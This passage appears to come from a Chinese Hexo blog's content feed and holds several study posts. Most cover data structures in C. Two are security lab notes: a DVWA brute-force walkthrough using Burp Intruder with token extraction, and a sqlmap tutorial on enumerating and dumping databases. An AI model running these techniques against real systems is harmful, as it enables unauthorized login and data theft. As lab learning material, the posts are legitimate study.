invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>代码加入了token，可以抵御CSRF攻击，同时增加了爆破的难度，登陆验证时提交了四个参数<br>token的目的是为了减轻服务器压力，减少频繁的查询数据库，使服务器更加健壮。</p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>同样随便输抓个包看一下<br><img src="/2022/08/16/force/image-20220816163602836.png" style="zoom:67%;"><br>返回了个<img src="/2022/08/16/force/image-20220816165137129.png" alt></p>
<p>我们可以看到他同时提交了四个参数usename,password,login,user_token<br><img src="/2022/08/16/force/image-20220816163704341.png" alt><br>爆破走起，参数调整准备轰炸（为了节约时间没有导入大数据字典)<br><img src="/2022/08/16/force/image-20220817100950217.png" alt><br><img src="/2022/08/16/force/image-20220817101005531.png" alt><br>此处一串符号为options中gerp-extract选入的token值<br><img src="/2022/08/16/force/image-20220817101118814.png" alt><br>上下文不照是因为又开了一个三位爆破的进程在运行笛卡尔积情况下的爆破，所以是一个新的请求位置就是这个位置。<br>找最与众不同的那个<br><img src="/2022/08/16/force/image-20220817101411420.png" alt><br><img src="/2022/08/16/force/image-20220817101438555.png" alt><br>成功登录</p>
<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p>相比于high级别主要多了以下代码<br><img src="/2022/08/16/force/image-20220817102357929.png" alt><br>每登陆失败三次就要等15s钟<br><img src="/2022/08/16/force/image-20220817102441140.png" alt><br><img src="/2022/08/16/force/image-20220817102505788.png" alt><br><img src="/2022/08/16/force/image-20220817102543236.png" alt><br><img src="/2022/08/16/force/image-20220817102602350.png" alt><br>采用了更为安全的PDO机制防御sql注入</p>
]]></content>
      <tags>
        <tag>web攻防</tag>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>串的存储结构</title>
    <url>/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>串的顺序存储、链式存储的代码实现和基本操作的代码实现</p>
<span id="more"></span>
<h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><h3 id="串的顺序存储"><a href="#串的顺序存储" class="headerlink" title="串的顺序存储"></a>串的顺序存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255     <span class="comment">//预定义最大串长为255</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];   <span class="comment">//每个分类存储一个字符</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的实际长度</span></span><br><span class="line">&#125;SString;<span class="comment">//静态数组实现（定长顺序存储）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *ch;          <span class="comment">//按串长分配存储区，ch指向串的基地址</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的长度</span></span><br><span class="line">&#125;HString;<span class="comment">//动态数组实现（堆分配存储）</span></span><br><span class="line">HString S;</span><br><span class="line">S.ch = (<span class="type">char</span> *)<span class="built_in">malloc</span>(MAXLEN*<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">S.length=<span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>优点：随机存取</p>
<p>缺点：插入删除操作不方便</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604165848221.png" alt></p>
<p>方案一：需要额外一片空间</p>
<p>方案二：length只占1B即8bit所以数组不能超过255</p>
<p>方案三：每次求表长都需要遍历整个字符串</p>
<h3 id="串的链式存储"><a href="#串的链式存储" class="headerlink" title="串的链式存储"></a>串的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch;                      <span class="comment">//每个结点存一个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;             <span class="comment">//存储密度低，每个字节1B，每个指针4B</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//改良</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">4</span>];                   <span class="comment">//每个结点存多个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604171058073.png" alt><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604171107252.png" alt></p>
<h3 id="基本操作的实现"><a href="#基本操作的实现" class="headerlink" title="基本操作的实现"></a>基本操作的实现</h3><h4 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172524171.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">SubString</span><span class="params">(SString &amp;Sub,SString S,<span class="type">int</span> pos,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">//子串范围越界</span></span><br><span class="line">    <span class="keyword">if</span>(pos+len<span class="number">-1</span>&gt;S.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;len+pos;i++)</span><br><span class="line">        Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">    Sub.length=len;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="比较两个串的大小"><a href="#比较两个串的大小" class="headerlink" title="比较两个串的大小"></a>比较两个串的大小</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220604172617169.png" style="zoom:67%;"><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172621936.png" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">StrCompare</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=S.length &amp;&amp; i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]!=T.ch[i])</span><br><span class="line">            <span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描过的所有字符都相同，则长度长的串更大</span></span><br><span class="line">    <span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172716580.png" alt></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172735794.png" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,n=S.length,m=T.length;</span><br><span class="line">    SString sub;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n-m+<span class="number">1</span>)&#123;</span><br><span class="line">        SubString(sub,S,i,m);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>串</tag>
      </tags>
  </entry>
  <entry>
    <title>串的基本操作</title>
    <url>/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>串的定义增删改查和字符集拓展内容的学习</p>
<span id="more"></span>
<h2 id="串的基本操作"><a href="#串的基本操作" class="headerlink" title="串的基本操作"></a>串的基本操作</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>即字符串（string）由零个或者多个字符组成的有限序列，一般记为：</p>
<script type="math/tex; mode=display">
S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为空串</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162622856.png" alt></p>
<p>子串：串中任意个<strong>连续</strong>的字符组成的子序列</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163002890.png" alt></p>
<p>主串：包含子串的串</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162948821.png" alt></p>
<p>字符在主串中的位置：字符在串中的序号  （ps：空格也是一种字符）</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162939273.png" alt></p>
<p>子串在主串中的位置：子串的第一个字符在主串中的位置</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604162903691.png" style="zoom:67%;"></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163018603.png" style="zoom:67%;"></p>
<p>串是一种特殊的线性表，数据元素之间呈现线性关系</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163702551.png" alt></p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604163803577.png" style="zoom:80%;"></p>
<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>y=f(x)</p>
<p>字符集：函数定义域</p>
<p>编码：函数映射规则f</p>
<p>y：对应的二进制数</p>
<p>英文字符——ASCII字符集  （2^8只有256种状态）</p>
<p>中英文——Unicode字符集</p>
<p>考研中默认每个字符占1B</p>
<h4 id="拓展——乱码问题"><a href="#拓展——乱码问题" class="headerlink" title="拓展——乱码问题"></a>拓展——乱码问题</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220604164822168.png" alt></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>串</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sqlmap的get使用方法和post使用方法以及其他技巧(更新ing~)</p>
<span id="more"></span>
<h2 id="get使用方法"><a href="#get使用方法" class="headerlink" title="get使用方法"></a>get使用方法</h2><p>(1)查看是否有注入点：sqlmap -u 网址<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143754072.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143808583.png" alt><br>证明有注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143944207.png" alt><br>得到服务器操作系统为linux centOS，后端语言为php，数据库为mysql</p>
<p>(2)获取数据库<br>        ((1))获取全部数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144244725.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144303120.png" alt><br>        ((2))获取当前数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144412391.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144432759.png" alt="image-20220815144432759"></p>
<p>(3)获取当前数据库里所有表<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144547931.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144611455.png" alt="image-20220815144611455"></p>
<p>(4)获取表的字段<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145336829.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145356494.png" alt></p>
<p>(5)获取字段内容<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145525659.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145534950.png" alt><br>如果字段内容多的话可以再加上如 —start 1 —stop 100 ——获取1-100条数据<br>—dump 可以换成 —dump-all 导出全部内容</p>
<h2 id="post使用方法"><a href="#post使用方法" class="headerlink" title="post使用方法"></a>post使用方法</h2><p>通过burp抓包请求<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150536388.png" alt><br>用txt形式保存<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150558636.png" alt><br>检验注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150625346.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150643242.png" alt="image-20220815150643242"><br>获取库名<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150734338.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150746967.png" alt><br>其余步骤与get一样</p>
<h2 id="指定位置的注入"><a href="#指定位置的注入" class="headerlink" title="指定位置的注入"></a>指定位置的注入</h2><p>在想注入的地方加<em><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151258357.png" alt><br>运行sqlmap后就会探测到</em>号<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151341838.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151409577.png" alt="image-20220815151409577"></p>
<h2 id="盲注使用不接收http-body"><a href="#盲注使用不接收http-body" class="headerlink" title="盲注使用不接收http body"></a>盲注使用不接收http body</h2><p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151536755.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151554688.png" alt="image-20220815151554688"></p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>数据库</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>吐槽</title>
    <url>/2022/08/14/%E5%90%90%E6%A7%BD/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b9a65e82c35f366bb877f81b5bc7a6399eae6f51e8132b2078553c6096c19e5d">9925390bebf6984373a839862eef41f931af2bb8f7d76ea6c0e5707626d5a5a4e2a0222893318c22ae684cfe2fcea95cf77c2ed6887195b707fdb14130f34fbef2be8ba38e187bc49577c1ade86e4c565c1ab919414102441050ee554331b89b30bbf427bb7a643eaeb3f0ff1827663e7736076daef2b3ac44b551c567914ae27b353167c9c65013e8a80f73d8abe59d408ee9d4e624ccddc80090fe5d6d327ecbc895d3ac236741bc7b993f6d00aef716b9150966e817f5feb0953b2bef648131dff3a1af2a66f75839270e2e01bcad853db54343ab701516d85eb026e36b8c25aa90c492989b4af27ebede1a903f89b335eaa60e2c8b540644d0da13486ff3019e27e39511e769697fb252719bb8ec56c7facec860f3d068a08207ec8886ab52c38c39fe3ea2651846d8efff594f2866e5912d1a524b1a1dda92ffa94f96e6e3dba58c6c6d913118fc6199d645af1636f29f0dfd7de8b881d2e272c391579b5b97d2d65741b5589ddc4c39bf65978d8e4cf19318699d954d12fbb4804dcf90115227a4c44fdc23e1587afbdad9b6ee8544f88c37360524c6749d8fa5f5b20ab17c7761ec10835adbbdbf4e2c7ef247ae47b85dc550cb78e9f863a0b7eefd1f2ae101d4a04c42c4deb45e23b1e978e6e749c634f434ad2f7d86bf9c2ffda82f010de13310ef2dbae4faa320bd517e0b7d9a249992829a2c7fbfac603ae1b67479e7f7b70367d191629661c9e2d5a6293105630fe9039244458ca5c3b4e672c4ddbfa2c2522f36c22c6c6c5d87caa1c1a2de3e011f0d57bbcac7a75e5a97d87ea99fc63c89de9474c1719c31042e3f84</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这可是我的挚爱亲朋，手足兄弟，得要密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>随笔</tag>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵</title>
    <url>/2022/08/14/%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>矩阵的存储代码实现</p>
<span id="more"></span>
<h2 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>ElemType a[10];    //ElemType型一维数组</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194725210.png" alt></p>
<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>ElemType b[2] [4]    //2行4列的二维数组</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194843476.png" alt></p>
<p>起始地址：LOC</p>
<p>行优先存储地址计算<img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603194958977.png" alt></p>
<p>列优先存储地址计算<img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195101464.png" alt></p>
<p>二维数组也具有随机存储的性质</p>
<h3 id="普通矩阵的存储"><a href="#普通矩阵的存储" class="headerlink" title="普通矩阵的存储"></a>普通矩阵的存储</h3><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195510230.png" alt></p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603195836998.png" style="zoom:67%;"></p>
<h3 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h3><p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603200202029.png" alt></p>
<h3 id="三对角矩阵（带状矩阵）"><a href="#三对角矩阵（带状矩阵）" class="headerlink" title="三对角矩阵（带状矩阵）"></a>三对角矩阵（带状矩阵）</h3><p>  <img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603200953049.png" alt></p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201426822.png" style="zoom:80%;"></p>
<h3 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h3><p>非零元素的个数远远少于矩阵元素的个数</p>
<p><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201607063.png" style="zoom:50%;"></p>
<p> <img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201638617.png" style="zoom: 80%;"><img src="/2022/08/14/%E7%9F%A9%E9%98%B5/image-20220603201828331-16604628178811.png" style="zoom: 67%;"></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和队列的应用</title>
    <url>/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>栈和队列的应用，如括号匹配，表达式值中的应用，递归，树、图的遍历等</p>
<span id="more"></span>
<h2 id="栈在括号匹配中的应用"><a href="#栈在括号匹配中的应用" class="headerlink" title="栈在括号匹配中的应用"></a>栈在括号匹配中的应用</h2><p>IDE:可视化的编程环境</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603180407947-16604625560341.png" style="zoom:67%;"><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603180507316.png" style="zoom:67%;"></p>
<p>扫描到左括号就入栈，扫描到右括号就出栈进行匹配 </p>
<p>代码实现</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603182409614.png" alt></p>
<h2 id="栈在表达式求值中的应用"><a href="#栈在表达式求值中的应用" class="headerlink" title="栈在表达式求值中的应用"></a>栈在表达式求值中的应用</h2><p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603183310686.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603184904342.png" alt></p>
<p>先出栈的是右操作数，后出栈的是左操作数 </p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603191739417.png" alt></p>
<h2 id="栈的应用——递归"><a href="#栈的应用——递归" class="headerlink" title="栈的应用——递归"></a>栈的应用——递归</h2><p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192451544.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192500473.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603192716850.png" alt></p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603193038318.png" alt></p>
<p>递归调用时，函数调用栈可称为递归工作栈</p>
<p>递归算法的缺点：太多层递归可能导致栈溢出。可能包含多次重复计算</p>
<h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p>具体查看树的章节</p>
<h3 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h3><p>具体查看图的章节</p>
<h3 id="在操作系统中的应用"><a href="#在操作系统中的应用" class="headerlink" title="在操作系统中的应用"></a>在操作系统中的应用</h3><p>FCFS(First Come First Service)先来先服务的策略</p>
<p>eg1：</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603194341970.png" alt></p>
<p>轮流获得cpu的服务</p>
<p>eg2：</p>
<p><img src="/2022/08/14/%E9%98%9F%E5%88%97%E7%9A%84%E5%BA%94%E7%94%A8/image-20220603194439959.png" alt></p>
<p>可缓解主机域打印机速度不匹配的问题</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>队列</title>
    <url>/2022/08/13/%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>队列的定义，以及队列的顺序存储结构和链式存储结构的代码实现以及部分操作,双端队列的定义</p>
<span id="more"></span>
<h2 id="队列（Queue）"><a href="#队列（Queue）" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><p>只允许在一端插入，在另一端删除的线性表</p>
<p>入队：插入     eg：打饭，高速过闸口</p>
<p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603163038483.png" alt></p>
<p>插入的一段为队尾，删除的一端为队头</p>
<p>队列的特点：先进先出（First In First Out)(FIFO)</p>
<p>栈的特点：后进先出（LIFO）</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><img src="/2022/08/13/%E9%98%9F%E5%88%97/image-20220603163231846.png" alt></p>
<h2 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h2><h3 id="队列的顺序实现-初始化和判空操作"><a href="#队列的顺序实现-初始化和判空操作" class="headerlink" title="队列的顺序实现,初始化和判空操作"></a>队列的顺序实现,初始化和判空操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype data[MaxSize];     <span class="comment">//静态数组存放队列元素</span></span><br><span class="line">    <span class="type">int</span> front,rear;             <span class="comment">//队头队尾指针</span></span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front = Q.rear =<span class="number">0</span>;    <span class="comment">//初始时 队头队尾指针指向0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//声明一个队列（顺序存储）</span></span><br><span class="line">    SqQueue Q;</span><br><span class="line">    <span class="comment">//。。。后续操作。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
